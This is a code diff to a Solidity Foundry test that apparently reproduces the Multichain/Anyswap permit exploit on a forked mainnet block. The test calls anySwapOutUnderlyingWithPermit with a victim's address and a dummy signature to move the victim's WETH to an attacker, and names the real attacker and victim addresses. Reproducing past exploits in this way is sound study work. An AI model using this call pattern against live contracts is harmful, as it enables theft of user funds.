@@ -46,14 +46,17 @@ contract Exploit_Multichain is TestHarness, TokenBalanceTracker{
     AnyswapV1ERC20 swap20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
     IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
-    address constant internal ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
+    // actual attacker address: 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
+    address internal ATTACKER = address(this);
     address constant internal VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
     uint256 constant internal stole_WETH = 308636644758370382903;
     uint256 constant internal FUTURE_DEADLINE = 100000000000000000000;
-    
+
+    // In the actual attack, the attacker first exploited this with a contract
+    // and then transfered to their EOA. Here, we can simplify and just transfer to
+    // this contract.
     function setUp() external {
         cheat.createSelectFork("mainnet", 14037236); // We pin one block before the exploit happened.
-
         cheat.deal(address(this), 0);
 
         cheat.label(ATTACKER, "Attacker");
@@ -63,33 +66,23 @@ contract Exploit_Multichain is TestHarness, TokenBalanceTracker{
         cheat.label(address(weth), "WETH");
 
         addTokenToTracker(address(weth));
-        updateBalanceTracker(address(this));
-        updateBalanceTracker(VICTIM);
         updateBalanceTracker(ATTACKER);
+        updateBalanceTracker(VICTIM);
     }
 
     function test_attack() external {
-        cheat.startPrank(ATTACKER);
         console.log("\nBefore Attack Balances");
-        logBalancesWithLabel('Attacker Contract', address(this));
-        logBalancesWithLabel('Attacker EOA', ATTACKER);
+        logBalancesWithLabel('Attacker', ATTACKER);
         logBalancesWithLabel('Victim', VICTIM);
+        uint256 balanceBefore = weth.balanceOf(ATTACKER);
 
-        //swapRouter.anySwapOutUnderlyingWithPermit(from, token, to, amount, deadline, v, r, s, toChainID);
         swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, stole_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
         console.log("\nDuring Attack Balances");
-        logBalancesWithLabel('Attacker Contract', address(this));
-        logBalancesWithLabel('Attacker EOA', ATTACKER);
+        logBalancesWithLabel('Attacker', ATTACKER);
         logBalancesWithLabel('Victim', VICTIM);
-        cheat.stopPrank();
-        
-        // Send WETH from this contract to the attacker.
-        weth.transfer(ATTACKER, weth.balanceOf(address(this)));
 
-        console.log("\nAfter Attack Balances");
-        logBalancesWithLabel('Attacker Contract', address(this));
-        logBalancesWithLabel('Attacker EOA', ATTACKER);
-        logBalancesWithLabel('Victim', VICTIM);
+        uint256 balanceAfter = weth.balanceOf(ATTACKER);
+        assertGe(balanceAfter, balanceBefore);
     }
 
     // Used to get the underlying of the token
